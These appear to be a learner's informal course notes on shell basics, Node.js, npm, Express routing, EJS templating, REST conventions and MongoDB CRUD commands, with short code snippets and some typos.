#### 304. Windows Terminal Installation Instructions
- https://www.youtube.com/watch?v=qdwWe9COT9k&feature=youtu.be

- *How to Install Git Bash on Windows 10*
: Why you need it?
~> it's for development & coordination with other developers
~> so you can install other tools and packages like python

: Shell
~> Command Line Interface (CLI) for running commands on your computer
~> Most web servers run on Linux and the Shell is vital for interacting with those servers
~> Microsoft has a Terminal Program (used to access the Shell), but it runs MS Dos vs. Unix (Linux)

: Bash
~> Basically an Emulator for running Unix (LInux) shell on Windows

: Git
~> Version Control Software that helps developers collaborate when building software and websites (github.com)

: Git Bash is essentially a package that installs both Git and Bash at the same time (https://git-scm.com/downloads)

<br>

#### 305. The Basics: LS & PWD
- Use GIT BASH!
- home directory

- LS: list the contents of your current directory

- "~" : reference to the home directory!

- PWD: Print Working Directory //Prints the path to the working directly (where you are currently)

<br>

#### 306. Changing Directories
- CD: Change Directory //Change and move b/w folders!

- cd.. : back one up

<br>

#### 307. Relative VS. Absolute Paths!
- absolute path <= can access from anywhere
: starts with "\"

ex. Relative Path: cd ../../Pets
~> go Two levels up then go to the folder Pets!

<br>

#### 308. Making Directories
- mkdir(make directory) will create a new directory or new directories

<br>

#### 309. Man Pages AND Flags
- "Man": show info about the following command!
ex. $ man ls
ex. then q to quit!

~> Not supported in Git Bash though
~> Use  <command> --help instead!

- "Flags"
: several options specific to the command

- cf. hidden files: start with "." and can be found with ls -a

<br>

#### 310. The Touch Command
- touch to create a file or multiple files
: while primary purpose of this is to set the modification and access time of files

- ex. touch purple.txt

<br>

#### 311. Removing Files & Folders

- rm: delete a file or files... permanently!

- rmdir: delete a directory, only an empty one!
- rm -rf: delete a directory even if it is not empty! (r = recursive, f = force)

<br>

## 31. Our First Brush With Nodes
#### 312. What Matters In This Section?
- Crucial
: The Node REPL!
: Running Node Files
: Installation

- Important
: Process

- Nice To Have
: argv
: File System Module! (Don't Let it Stress You Out)

<br>

#### 313. Introducing Node JS
- What is Node?
: "A JavaScript Runtime"
: Until recently, we could only run JavaScript code in a web browser. Node is a JavaScript runtime that executes code outside of the browser
: We can use the same JavaScript syntax we know and love to write server-side  code instead of relying on the other languages like Python or Ruby

~> can run JS without even opening a web browser!

- nodejs.org/en

<br>

#### 314. What Is Node Used For?
- What do people build with it?
: Web Servers
: Command Line Tools
: Native Apps (VSCode)
: Video Games
: Drone Software
: A Whole Lot More

<br>

#### 315. Installing Node
- Terminal
~> type "node": not found => install node
~> nodejs.org

<br>

#### 316. Node REPL
- REPL
: Read
: Evaluate
: Print
: Loop

- Once Node is installed you can write JS in terminal

- Node JS VS. Client-side JS
: Not included in Node
~> because Node doesn't run in a browser, we don't have access to all the browser "stuff". The window, document, and DOM API's are not supported in node

: New Stuff in Node!
~> node comes with tons of built-in modules which are not available in a browsers. These modules help us to do things like interact with the operating system and files/folders.

ex. document, window ~> not available in node
ex. global object ~> window in browsers
~> global in node

ex. setTimeout(()=> console.log("HELLO!"),3000)

<br>

#### 317. Running Node Files
- ex. touch firstScript.js
  ex. and to run, node firstScript.js

<br>

#### 318. Process & Argv
- Node js itself is a big topic, and we are only touch its surface
- Node js itself comes with a lot =>documentation

- ex. node ~> version
  ex. node -v

- NVM: Node Version Manager

- ex. Process: The process object is a  global that provides information about, and control over, the current Node.js process. As a global, it's always available to Node.js applications without using require(). It can also be explicitly access using require()!

- ex. process.version
  ex. process.cwd()

- ex. process.argv

~> the process.argv property returns an array containing the command line arguments passed when the Node.js process was launched. The first element will be process.execPath. See process.arv0 if access to the original value of argv[0] is needed. The second element will be the path to the JS file executed. The remaining elements will be any additional command line arguments.

ex. node args.js puppie chickens hello
~> HELLO FROM ARGS FILE!
   [
      '/usr/local/bin/node'
      '/Users/coltsteele/Code/25_Node_Intro/args.js',
      'puppies',
      'chickens',
      'hello!'
   ]
ex. touch greeter.js

<br>

#### 319. File System Module Crash Course!
- refer to docs!

- ex. make a folder and index.html & app.css & app.js in that

- ex. const fs = require('fs);
  ~> no need to download it or anything, but it's not default in the scope and we gotta tell that we will use it

  ex. touch boilerplate.js
  ex. refer to the code files!

- NOTE. Synchronous vs. Asynchronous

: the asynchronous form always takes a completion callback as its last argument. The arguments passed to the completion callback depend on the method, but the first operation was completed successfully, then the first argument will be *null* or *undefined*

: exceptions that occur using synchronous operations are thrown immediately and may be handled using try-catch

: synchronous will block the whole process until they complete, halting all connections

<br>

## 32. Exploring Modules AND  The NPM Universe
#### 320. What Matters In This Section
- Crucial
: Module.Exports
: Requiring Modules
: Using NPM
: Installing Packages
: Creating Package.json Files

- Nice To Have
: The Dad Jokes Package
: Rainbow Package
: The Figlet Package
: Franc Package

<br>

#### 321. Working With module.exports
- Sharing JS codes b/w the files!

- can decide whether to share files and require them

- ex. touch math.js
  ex. const add=(a,b)=>a+b;
  
  ex. touch app.js
  ex. const math = require('./math')
  ex. console.log(math)

- When referencing a file, rather than an existing module (ex. fs), you have to write './' at the front

- ex. node app.js
      ~> {}!!!!!!!
      ex. const add = (x,y) => x+y;
      ex. const math = {
            add: add
          }
      ex. module.exports.math = math
      ~> unlike outisde node, where linking js files using \<script> and the linked contents become available, you have to explicitly *specify* which you want to export out of the file
      ~> using module.exports.~~~ or exports.~~~ (shorthand ) 

- ex. in math.js,
  ex. module.exports = "HELLOOO"
      ~> by default, it is an object

  ex. now node app.js returns "HELLOOO
  
  ex. module.exports.add = add
  ex. module.exports.PI = PI
  ex. module.exports.square = square

  ~> remember that this is an **object** again!
  ~> thus adding methods to it

  ex. then node app.js returns the object with methods

- refer to the code to see how you can export
  ex. module.exports.add = (x,y) => x+y;

  ex. const math = {
          add:add
      }
  ex. module.exports = math

  ex. exports.add = add

<br>

#### 322. Requiring A Directory
- You can require the entire directory

ex. mkdir shelter
ex. touch blue.js sadie.js janet.js
    //each is an exported object

- make **"index.js"**  and require all files in the same directory!

ex. const blue = require ('./blue')
ex. const sadie = require ('./saide')
ex. const janet = require ('./janet')

ex. const allcats = [blue, sadie, janet]
    module.exports = allcats;

- when you reference a directory, it will look for index.js

ex. in app.js,
    const allcats = require ('./shelter')

<br>

#### 323. Introducing NPM
- NPM: Node Package Management
:  NPM is really two things
~> A library of thousands of packages published by other developers that we can use for free!
~> A command line tool to easily install and manage those packages in our Node projects

- npmjs.com

<br>

#### 324. Installing Packages - Jokes & Rainbow

- https://www.npmjs.com/package/give-me-a-joke

- https://www.npmjs.com/package/colors

- Core Mechanic
: a terminal command called **npm install [package_name]

- ex. npm install give-me-a-joke
      ~>  'node-modules' folder appears!
      
  ex. package-lock.json
      ~> contents of node-modules!

- ex. const jokes = require ('give-me-a-joke')
      ~> looks for the package in node-modules!
  
  ex. console.log(jokes)
      ~> four different methods
  
  ex. jokes.getRandomDadJoke(function(joke){
          console.log(joke);
      });

- ex. npm install colors

<br>

#### 325. Adding Global Packages
- https://www.npmjs.com/package/cowsay
- Local vs. Global installation of Packages

- Local installation
~> packages are only available (or easily available) inside the folder they are installed!
~> preferrable way
~> reason 1. we don't want to access the package everywhere (because we may want variety)

- Global installation
~> SOMETIMES preferred! for Command Line Tools
~> ex. npm i -g cowsay

=> then package is installed in the global node-modules folder

- but you can't just "require" global packages locally!
~> gotta "link" then

ex. in the terminal, npm link cowsay
ex. in the index.js,
    const cowsay =require('cowsay')

<br>

#### 326. The All-Important Package.json
- Packages have "packages.json" files
: contains meta-data or information about the project/package

- what we care about the most
: "dependencies!!"
: ex. give-me-a-joke
~> "axios": "^0.19.2"
: dependencies of the specific versions are installed too! so packages.json is looked into!

- the way that we create packages.json ~> using npm command!

- ex. mkdir Artster
  ex. cd Artster
  ex. npm init
      ~> creation utility for the packages.json
      ~> the easiest way of making the packages.json which conforms to the standard rules!

- now if we import packages
  ex. npm i figlet
  ~> no warning about lacking packages.json
  ~> packages.json wouldn't affect how the codes works (as long as all required modules/packages are in node-modules, but we want them to be synchronized, in case node-modules is deleted or the packages are shared with other developers)

<br>

#### 327. Installing All Dependencies For A Project
- https://github.com/dkhd/node-group-chat

- NOTE: we usually DO NOT include node-modules when sharing packages! 
~> the user will install the required ones based on packages.json instead
~> for a reasonably-sized packages!

- ex. node-group-chat
      => download .zip

  ex. cd node-group-chat-master
  ex. node index.js
      ~> Error! because the module 'express' cannot be found

  ex. in the same folder where packages.json is saved,
  ex. npm install
      => packages.js will be reviewed and dependencies are installed

<br>

#### 328. Language Guesser!
- https://github.com/wooorm/franc
- https://github.com/adlawson/nodejs-langs
- we will use **franc**package to detect the language and return the language codes [ISO], and then **langs**package to convert the language code to the lang names!

<br>

## 33. Creating Servers with Express
#### 329. What Matters In This Section
- Crucial
: Our First Express App!
: Routing Basics
: Path Parameters
: Working With Query Strings
: What are frameworks?

- Important
: Nodemon

<br>

#### 330. Introducing Express!
- A node package, just like any other package we have used, except it is also a framework!

- What is Express?
: Our First Framework!
~> Express is a "fast, unopinionated, minimalist web framework for Node.js". It helps us build web apps!
~> it's just an NPM package with lots of methods and optional plugins that we can use to build web applications and API's

- Express helps us...
1. Start up a server to listen for requests
2. Parse incoming requests
3. Match those requests to particular routes
4. Craft our http response and associated content

- Libraries vs. Frameworks
: both are codes that someone else has written
1. Library: When you use a library, you are in charge! You control the flow of the application code, and you decide when to use the library
2. Framework: With frameworks, that control is inverted. The framework is in charge, and you are merely a participant! The framework tells you where to plug in the code.
~> less freedom but more features

<br>

#### 331. Our Very First Express App
- ls, mkdir FirstApp, cd FirstApp, ls
- npm init -y

- note. you cannot use captial letters for the app name!
~> thus change to firstapp in packages.json

- now that we have "packages.json", we can install Express!!

- npm install express
~> now, in the folder "node_modules", express and its required stuff is saved!

- Now make the express file...
: touch index.js

- our goal here - is to get the server up and running

- ex. const express = require ('express')
  ex. const app = express()
  ~> in the docs: this pattern is common
  ex. console.dir(app)
  ~> app object!

- ex. app.listen(3000, () => {
          console.log("LISTENING ON PORT 3000")
      })

      //listening to the incoming requests to the server we set up!
      ~> this is only served locally in my machine!
      ~> remember the port number! in this case, 3000!
      ~> "localhost" :  reference to this machine
      ~> ex. localhost:3000
          => error, because there is nothing to present on that server

      ~> goal: to get incoming requests and get outgoing response

      ~> ex. app.use(() => {
                  console.log("WE GOT A NEW REQUEST!")
             })
      // app.use() ~> anytime there is an incoming request, this callback will run

      ~> everytime we refresh, we see that request line!

- common port numbers: 3000, 8080

<br>

#### 322. The Request & Response Objects
- In order to respond with contents, we need to discuss **two important objects** that Express makes for us
~> On every incoming reqeust, we have access to "req" [object representing the incoming request ] and "res" [obj representing the outgoing response]
~> these objects are *made by express* AND *passed in* through the 
: app.use ((req, res) => {
        console.log("WE GOT A NEW REQUEST!")
        console.dir(req)
  })
  callback!

- NOTE. http request: not a JS object, but text information
~> Express takes this data and parses it into an object!
: console.dir(req)
~> a lot of information in the req!!
ex. pathname: '/' => URL we are requesting! 
ex. "localhost:3000/dogs"
~> pathname: '/dogs'

- **response object** has methods on it
~> incl. res.send ([body])
~> express docs
~> sends the http response, in String, Object, or others

ex. app.use((req, res) => {
          console.log("WE GOT A NEW REQUEST!")
          res.send("HELLO, WE GOT YOUR REQUEST! HERE'S THE RESPONSE!")
          //res.send() generating and sending an HTTP response

          res.send({color:"red"})
          //application/json

          res.send('<h1>This is my webpage</h1>')
    })


- Postman: GET | localhost:8080, send
~> body: "HELLO, WE GOT YOUR REQUEST! HERE'S THE RESPONSE"
~> header: content-type=> text / html

~> if we send the object instead, we get the header content-type application/json!

<br>

#### 333. Express Routing Basics
- How we respond with different contents to different requests
- Routing: path the incoming requests and match them to some responses
ex. of paths: /dogs

ex. // /cats => "meow"
    // /dogs => "woof"
    // /(home route or ROOT) => "welcome to our home page"
ex. // app.get(path,  callback function)
    app.get('/cats' , (req, res) => {
        console.log("CAT REQUEST !!")
        res.send('MEOW')
    })

- NOTE: **comment out the app.use code!** as there's only one response to each http request, and res.send() is that response

- again, "res" is the object which has a lot of methods on it

- (req, res)=> { ~~~ } ~> v common pattern

- how to deal with all the other things?
: app.get('*', (req, res) => {


        res.send("i dont know that path!')
  })
~> make sure! that is it at the end of the code

<br>

#### 334. Express Path Parameters
- Patterns!!
: help better searching

- ex. pattern in /r/SOMETHING

~> app.get ('/r/:subreddit' , (req, res) => {
      res.send('This is a subreddit!'))
  }
  => localhost:3000/r/puppy ~> responds with "This is a subreddit"

- and here, :subreddit can be accessed as params through req
: console.log(req.params)
~> ex. {subreddit : 'aeriocvladf;k'}

: const {subreddit } = req.params
  res.send(`Browsing the ${subreddit} subreddit`)

: multiple patterns are OK too

<br>

#### 335. Working With Query Strings
- reminder: query strings are something that comes after the question mark!

- Key-Value Pairs!

- the req object has a specific property called query!!!!!
ex. app.get('/search', (req, res) =>{
        console.log(req.query)
        res.send('HI')
  
      //const {q} = req.query;
      // res.send(`<h1>Search results for : ${q})
    })

ex. in postman, q = dogs and color = red
~> { q: 'dogs', color: 'red' }

<br>

#### 336. Auto-Restart With Nodemon
- could be annoying to restart the server anytime there's a change
~> there are several ways to get away with it

- we use the package called 'nodemon'
~> command-line tool
~> install globally
~> nodemon ~~~  instead of node ~~~, then automatic. tracks changes!!

- npm i -g nodemon

<br>

## 34. Creating Dynamic HTML With Templating
#### 337. What Matters In This Section
- Crucial
: What Is Templating?
: Configuring Express for EJS
: Passing Data to Templates
: Serving Static Assets
: Creating Partials
: EJS Loops& Conditionals

<br>

#### 338. What is Templating?
- Templating allows us to define a preset "pattern" for a webpage that we can dynamically modify wi
- For example, we could define a single "Search" template that displays all the results for a given search term. We don't know what the term is or how many results there are ahead of time. The webpage is created on the fly.

~> we can repeat parts of the template over and over with loops, for example!

~> End Goal: to combine logic with creating HTML responses
~> many ways to do it, but we choose

- EJS
: Embedded JavaScript
: Others - Handle bars, Jade, Pug, Numjucks, Etc.
=> unique syntax

: reasons why we are using this
~> very popular
~> *uses JS syntax*

<br>

#### 339. Configuring Express for EJS
- ejs.co

- first, a simple Express app to use ejs

- ex. Templating_Dome > npm init -y
      npm i express
      touch index.js

- in index.js,
  ex. const express = require ('express');
      const app = express();
      //execution of Express

      app.listen(3000, () => {
          console.log("Listening on Port 3000")
      })

      //simple routing
      app.get('/', ( req, res ) => {
          res.send("HI");
      }

=> start with nodemon!

- Now it's the time to make it use EJS!
  ex. app.set("view engine", ,"ejs");
      // app.set takes two arguments
      // key (property) - value!
  
- also need to NPM install EJS!
  ex. npm i ejs

  ~> don't need to "require" ejs in index.js (done behind the scene)

- when we use view engine, Express assumes that the views(or templates) are stored in the folder called "views"
  ex. mkdir views

- now it's the time to make templates!
  ex. touch views/home.ejs

- in the EJS file, start with HTML boilerplate!

- now inside index.js, instead of app.get > res.send("HI"), you can send back a template!

~> method we use for that is "render"
=> ex.res.render('home.ejs')
   //no need to specify as views/home.ejs as views folder is the default

<br>

#### 340. Setting The Views Directory
- the minor issue that you may encounter : views folder should be in the same folder you're executing in!
ex. cd ..
ex. nodemon Templating_Demo/index.js
~> Error!! wah

- to avoid this issue,
  ex. const path = require ('path')
  
  ex. app.set('views', path.join(__dirname,'/views'))
      //joining the directory name where index.js is saved and /views

- path module: related to directory and file paths! ex. path.join: joins multiple strings to normalize them into a single path

<br>

#### 341. EJS Interpolation Syntax
- let us learn some basic EJS syntax!
- ejs.co: esp. "TAGS"
~> these tags tell EJS that the following is not regular HTML

- NOTE: in VSCode, there is an "EJS Extension"!

1. <%= : Outputs the value into the template (HTML escaped!)

ex. in home.ejs,
    <%= 4 + 5 + 1 %> // treated not as HTML, but as js!

<br>

#### 342. Passing Data to Templates
- define a simple route in index.js ('/rand')

- you can enter the math eq <%=Math.random~~~%> inside the <h1>, but it's a better practice to define the number first then pass it to the template

- in index.js,
  ex. app.get('/rand', (req, res) => {
          const num = Math.floor(Math.random()*10)+1
          res.render('random', {rand: num} )
      })
      ~> second argument passed in as an object!
      ~> whatever "num" is, will be accessible through "rand" in the template

- in rand.ejs,
  ex. <%=rand%>

<br>

#### 343. Subreddit Template Demo
- ex. app.get('/r/:subreddit', (req, res) => {
          const {subreddit} = req.params;
          res.render('subreddit', {subreddit})
      })

<br>

#### 344. Conditionals in EJS
- <% %> : embeds JS code except actually rendering result!
- ex. <% if (num % 2 === 0) { %>
      <h2> That is an even number!</h2>
      <% } %>

- ex. <%= num%2===0 ? 'EVEN' : 'ODD'%>

<br>

#### 345. Loops Using EJS
- ex. app.get('/cats', (req,res)=> {
          const cats = [
              'Blue', 'Rocket', 'Monty', 'Stephanie', 'Winson'
          ]
})

<br>

#### 346. More Complicated Subreddit Demo
- data.json
- in index.js,
  ex. const redditData = require('./data.json')

- ex. app.get('/r/:subreddit', (req, res) => {
      const {subreddit} = req.params;
      const data = redditData[subreddit];
      res.render('subreddit', {...data})
})

<br>

#### 347. Serving Static Assets In Express
- "serving" css, js, html, fonts, etc

- express.static() ~> "middleware"
  app.use(express.static())
  => app.use runs for every single request (get/post/etc.)

- middleware: runs between getting request and outputing response
- ex. app.use(express.static('public'))
  //server the public directory where css and js files are saved

  ex. then in subreddit.ejs,
  ex. <link rel = "stylesheet" href = "app.css">

- though to have access to files wherever, we want to introduce absolute paths!
  ex. app.use(express.static(path.join(__dirname,  'public')))

<br>

#### 348. Bootstrap + Express
- duplicate Templating_Demo

- mkdir public
  mkdir public/css public/js

- download Compiled CSS and JS From Bootstrap!
: then move the files ~~~.min.css/js to the folder we are working in

- now in subreddit.ejs,
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <script src= "/js/bootstrap.min.js" >
- while jQuery is also required! : could use CDN but will download this time (compressed)

- now load that jQuery before .js file
  <script src="/js/jQuery.js">

- let's now add the navbar!

<br>

#### 349. EJS & Partials
- Partials: Sub-templates inside Others!

- Basic Idea
: To make a template that all the templates should have in common, then include it

- make a folder called partials!(don't need to do so but our Colt prefers it)

- in EJS way, <%-include ("/partials/head") %>

- <%- %> =>  "unescaped"! meaning treated as html

<br>

## 35. Defining RESTful Routes
#### 350. What Matters In This Section 
- Crucial
: GET VS. POST Requests
: Parsing Request Body
: Forms + Express
: Handling Post Requests in Express

- Important
: Method Override
: RESTful Routing

<br>

#### 351. Get Vs. Post Requests
- Get
: Used to retrieve information
: Data is sent via query string
: Information is plainly visible in the URL!
: Limited amount of data can be sent

- Post
: Used to post data to the server
: Used to write/create/update
: Data is sent via request body, not a data string!
: Can send any sort of data(JSON!)

- Simple recall ex.
: <form action="/tacos"  method = "get" >
      <input type="text" name="meet">
      <input type="number" name="qty">
      <button>Submit</button>
  </form>
  => in the URL the submitted information is shown

- Example of Post
: <form action="/tacos" method = "post">
      <input type="text" name = "meat">
      <input type="number" name="qty">
      <button>Submit</button>
  </form>

<br>

#### 352. Defining Express Post Routes
- let's talk about handling the post requests in Express!
: cf. making post requests is no different from making get requests as shown above

- refer to the code! RESTDemo & getpost.html

<br>

#### 353. Parsing The Request Body
- req.body
: contains key-value pairs of data submitted in the request body. By default, it's undefined, and is populated when you use body-parsing middleware such as body-parser and multer.

- we need to explicitly tell how to parse req.body

- ex. tell express to parse form-encoded information to req.body
: built-in in express
: => app.use(express.urlencoded({extended : true}))
  //applicable only to form data
: => app.use(express.json)
  // applicable to JSON data
: ~> now console.log(req.body) gives out some data

- can deconstruct to deal with data better
: ex. const {meat, qty} = req.body
  ex. res.send(`OK, here are your ${qty} ${meat} tacos`)

<br>

#### 354. Intro to REST
- Representational State Transfer!
: REST is an "architectural style for distributed hypermedia systems".

: It's basically a set of guidelines for how a client + server should communicate and perform CRUD operations on given resources!

: The main idea of REST is treating data on the server-side  as resources that can be CRUDed

: The most common way to approach REST is in formatting the URLs and HTTP verbs in your applications

- so, it's a set of guidelines and RESTful is when the apps comply with those ones!

- we care because we will create APIs and routes which are RESTful!

- some architectural constraints
~> client-server architecture
~> statelessness
~> cacheability
~> layered system
~> code on demand (optional)
~> uniform interface:URL patterns matched with different HTTP verbs

- so goal: combining some base URLs and different HTTP methods to expose the full CRUD operations over HTTP

- NOTE: Github GIST
~> technical posts(could be useful)

- and Github has an API to expose CRUD functionalities for GIST
: get ~> GET /gists
: post ~> POST /gists
: update ~> PATCH/gists
: delete ~> DELETE/gists
=> different  HTTP requests but the same endpoints!
=> an example of RESTful API!

- another example: Instagram!

<br>

#### 355. RESTful Comments Overview
- let's actually implemenet RESTful server architecture

- we don't have database yet, so let's pretend that we do using an array

- comment:username - comment_text

- ex. GET / allcomments
  ex. POST / newcomment ~> we usually use POST to CREATE something, as we can send more data&not shown in URL

- but we will do
  ex. GET /comments - list all comments  [index.ejs]
  ex. GET /comments/new - form to create new comments     [new.ejs]
  ex. POST /comments - create a new comment  [create.ejs]
  ex. GET /comments/:id - Get one comment (using ID)  [show.ejs]
  ex. PATCH /comments/:id - update one comment  [update.ejs]
  ex. DELETE /comments/:id - destory one comment  [destroy.ejs]
  ex. GET /comments/:id/edit - form to edit specific comment  [edit.ejs]

- note that there are MANY ways to implement REST, and the following is just one option

- we will also introduce EJS for interactiveness
  ex. npm i ejs
  ex. mkdir views
  ex. mkdir views/comments

- in index.js,
  ex. app.use('view engine','ejs')
  ex. const path = require('path')  
  ex. app.set('views',path.join(__dirname,"views"))

  ex. const comments = [...] //fake comments as an array
  
- base case
  ex. app.get('/comments', (req, res) => {
          res.render('comments/index',{comments})
  })
  ~> here, index is index.ejs

<br>

#### 357. RESTful Comments New
- in index.js,
  ex. app.get('/comments/new', (req, res) => {
          res.render('comments/new');
      })
- when ask for new comment form, a form is returned, and new comments in that form are posted

- in index.js,
  ex. app.post('/comments',(req, res)=> {
        console.log(req.body)
        //make sure there's something sent
        res.send("IT WORKED!")
  })

- and in new.ejs,
  <form action="/comments"method="post">

- note again that we did set up the body parser
  : app.use(express.urlencoded({extended: true}))
  : req.body parsing with urlencoded
  ~> any form data that comes in goes through parsing

- ex. const {username,comment} = req.body 
  ex. comments.push ( {username, comment} )

<br>

#### 358. Express Redirect
- status codes: 3xx is with redirects!

- default: 302 Found!!

- res.redirect('/comments'); //default - get

<br>

#### 359. RESTful Comments Show
- many people call is show / details route : show details on one particular resource !!

- ex. app.get('/comments/:id', (req, res) => {
        const {id} = req.params;
        const comment = comments.find(c => c.id === parseInt(id))
        res.render('comments/show')
        
})

- and we can start with hardcoded id's

<br>

#### 360. The UUID Package
- Problem! New comments do not have IDs

- https://www.npmjs.com/package/uuid

- Randomly Generate Universally Unique IDentifiers

- ex. npm i uuid 

- ex. const {v4: uuidv4} = require('uuid');
  ex. uuidv4(); //from docs

- const comments = [ { id: uuid(), ... } ]

<br>

#### 361. RESTful Comments Update
- Two HTTP Verbs that can update the contents - PUT and PATCH
- "PUT": update the whole thing

- "PATCH": partially change
  ex. app.patch('/comments/:id', (req, res) => {
          const {id} = req.params;
          const foundComment = comments.find(c => c.id === id)
          const newCommentText = req.body.comment;
          foundComment.comment = newCommentText;
          res.redirect ('/comments')
  })

- BUT note that this is not a preferred way, as IMMUTABILITY is important for web developers!

<br>

#### 362. Express Method Override
- http://expressjs.com/en/resources/middleware/method-override.html

- Now we want to create a form to UPDATE resources on the webpage

- ex. app.get('/comment/:id/edit')

- ex. edit.ejs

- ex. npm i method-override 
: lets you use HTTP verbs such as PUT or DELETE in places where the client doesn't support it

: 1. override using a header
: 2. override using a query value~> let's use this option!

- ex. const methodOverride = require('method-override')
  ex. app.use(methodOverride('__method'))
      // use methodOverride as a middleware!
  
  ex. <form method="POST" action="/resource?_method=DELETE"></form>

<br>

#### 363. RESTful Comments Delete
- you could possibly do it using JS, ex. axios, fetch

- app.delete('/comments/:id', (req, res) => {
      const {id} = req.params;
      comments = comments.filter(c => c.id !== id)
})

- it may seem a bit silly to make a new array, but it's generally a good practice to make a copy and not mutate the original

- DIGEST!!

<br>

## 36. Our First DataBase: MongoDB
#### 364. What Matters In This Section
- Crucial
: Installation
: The Mongo Shell
: Mongo Inserts
: Mongo Finding/Querying
: Mongo Updates
: Mongo Deletions

- Important
: Databases Basics
: SQL vs. NoSQL

<br>

#### 365. Introduction to Databases
- What is Mongo?
: OUR FIRST DATABASE!
: According to Mongo's homepage, it is "the most popular database for modern applications". It is commonly used in combination with Node.
: Mongo is a **document database**, which we can use to store and retrieve complex data from.

- Why use a Database?
: Instead of just saving to a file?
: Databases can handle large amounts of data efficiently & store it compactly!
: They generally offer security features & control over access to data
: They provide tools for easy insertion, querying, & updating of data.
: They (generally) scale well!!

<br>

#### 366. SQL vs. NoSQL Databases
- generally two types of databases!
1. SQL Databases
: Structured Query Language db's are relational db's. We pre-define a schema of tables before we insert anything.
: ex. MySQL, Postgres, SQLite, Oracle, Microsoft SQL Server

vs.

2. NoSQL Databases
: There are many types of NoSQL db's which do not use SQL including documents, key-value, and graph stores
: MongoDB, Couth DB, Neo4j, Cassandra, Redis
: very diverse

<br>

#### 367. Why use MongoDB?
- Why are we learning mongo?
: Mongo is very commonly used with Node and Express (MEAN & MERN stacks)
: it's easy to get started with (though it can be tricky to truly master)
: it plays particularly well with JavaScript
: its popularity also means there is a strong community of developers using Mongo

~> so it's an answer to 'we need some kind of database, so why can't it be something that is popular and compatible with what we have learned so far?'

- Still recommend to learn MySQL or Postgres in the next year

- Note that installing Mongo DB can be a pain in the ass!
: just follow the provided video (googling other stuffs may cause conflicts!) then it'll all be smooth

<br>

#### 368. Installing Mongo:MacOS
- https://docs.mongodb.com/manual/tutorial/install-mongodb-on-os-x/

<br>

#### 369. Installing Mongo:Windows
- follow the official guide
~> https://docs.mongodb.com/manual/tutorial/install-mongodb-on-windows/

<br>

#### 370. The Mongo Shell
- in terminal, mongo
~> when MongoDB is running on bg 
~> typing mongo will connect to Mongo Server

- https://zarkom.net/blogs/windows-local-coding-environment-1204
- https://www.loom.com/share/ec6493fff5b04f2f98ee1f10d00f2334

- ">" ~> Mongo shell!
~> also a JavaScript shell!(ex.1+2)

- ex. db
  ~> test
  : default database you will be using

- ex. show databases
  ex. show dbs

- ex. use animalShelter
~> create/move_to a db!!

- ex. db
~> now shows animalshelter

<br>

#### 371. What On Earth is BSON?
- mongodb.com/json-and-bson

- JSON: JavaScript Object Notation
: simple associative containers, wherein a string key is mapped to a value (which can be a number, string, function, or even another object). This simple language trait allowed JavaScript objects to be represented remarkably simply in text
: both human-readable and machine-readable and simple to implement support for other langs, became popular beyong the web

- Still some issues with JSON from the db perspective
1. JSON is a text-based format, and text parsing is very slow
2. JSON's readable format is far from space-efficient, another db concern
3. JSON only supports a limited number of basic data types

- BSON: Binary JSON
: a binary representation to store data in JSON format optimized for flexibility + speed + space

<br>

#### 372. Inserting with Mongo
- MongoDB - Docs - Server
- we will focus on "MongoDB CRUD Operations"

- let's create the db again in the previous video

- ex. mongo
  ex. show dbs
  ex. use animalShelter

- Insert Methods
~> db.collection.insertOne()
~> db.collection.insertMany()
~> db.collection.insert()

- Good thing about Mongo: if not existing yet, it makes one instead!!!

- ex. db.dogs.insertOne({name: "Charlie", age: 3, breed: "corgi", catFriendly: true})
  ex. show collections

- here, the object is JS object, not JSON

- ex. db.dogs.find()
~> object id is automatically generated
[unless you specify with "_id"]

- ex. db.collection.insert() ~> allows you to insert a document or array of documents

- ex. db.dogs.insert([{name: "Wyatt", breed: "Golden", age:  14,catFriendly: false}, {name: "Tonya", breed: "Chihuahua", age: 17, catFriendly: true}])

- NOTE: YOU DON'T NEED TO HAVE THE SAME FORMAT FOR ENTRIES (NO CONSTRAINTS)
- NOTE: MONGO NOW SUPPORTS THE CONSTRAINTS IF WANTED

<br>

#### 373. Finding with Mongo
- db.collections.find()
~> will find all the instance in collection

- ex. db.dogs.find({breed: "corgi"})
  ex. db.dogs.findOne({catFriendly: true})

  ~> db.collections.find() : returns "cursor" (covered later)
  ~> db.collections.findOne() : returns the document

<br>

#### 374. Updating with Mongo
- db.collection.updateOne()
  : update only the first one that matches
- db.collection.updateMany()
  : update all that match
- db.collection.replaceOne()

- when updating with Mongo, gotta use special operators!
- one of them is the "set"!
~> $set operator replaces the value of a field with the specified value
~> { $set: { <field1>: <value1>, ...}}

- ex. db.dogs.updateOne({name: 'Charlie'}, {$set: {age: 4, breed: "Lab"}})

- when the fields do not exist already, they are created per $set

- $currentDate: {lastModified:true}
  ~> to keep track of the dates when modifications are made

- ex. db.cats.updateOne({age:6},{$set: {age:7}, $currentDate: {lastChanged: true}})

~> now you can see "lastChanged" field which shows the ISODate (specific to BSON)
- ex. db.cats.replaceOne(...) ~> can change everything about the instance except for its id

<br>

#### 375. Deleting with Mongo
- db.collection.deleteMany()
  db.collection.deleteOne() ~>with some criteria

- ex. db.cats.deleteOne({name: "Blue Steele"})

- ex. db.dogs.deleteMany({})~> delete all in one go!

<br>

#### 376. Additional Mongo Operators
- ex. db.dogs.insert([
        {name:"Rusty",breed:"Mutt",personality:{catFriendly:true, childFriendly: true}},
        {name:"Chungus",breed:"Husky",personality:{catFriendly:false, childFriendly: true}}
        
      ])

- because catFriendly is not the field,
  ex. db.dogs.find({catFriendly: true}) does not work
  ~> instead,
  ex. db.dogs.find({'personality. catFriendly': true}) works

- Some other Operators!
  : Query Operators ~> so many!
  ex. $gt : greater than!
  ex. $gte: greater than or equal to
  ex. $in: in some array
  ex. $ne: not equal to
  ex. $or & $and

  ex. db.dogs.find({age: {$gte: 10}})
  ex. db.dogs.find({breed: {$in: ["Mutt", "Husky"]}})
  ex. db.dogs.find({breed: {$in: ["Mutt", "Husky"], age: {$gt: 12}}})
  ex. db.dogs.find({breed: {$ne: "Husky"}})

<br>

## 37. Connecting To Mongo With Mongoose
#### 377. What Matters In This Section
- Crucial
: The Roleof ORM / ODM's
: Connecting Mongoose to Mongo
: Defining A Model
: Mongoose CRUD
: Schema Constraints

- Important
: Model Instance & Static Methods
: Mongoose Middleware

- Nice To Have
: Mongoose Virtuals

<br>

#### 378. What is Mongoose
- https://mongoosejs.com/

- most of time, we'd use apps to use Mongo instead of using shell
~> drivers! [docs.mongodb.com/drivers/]
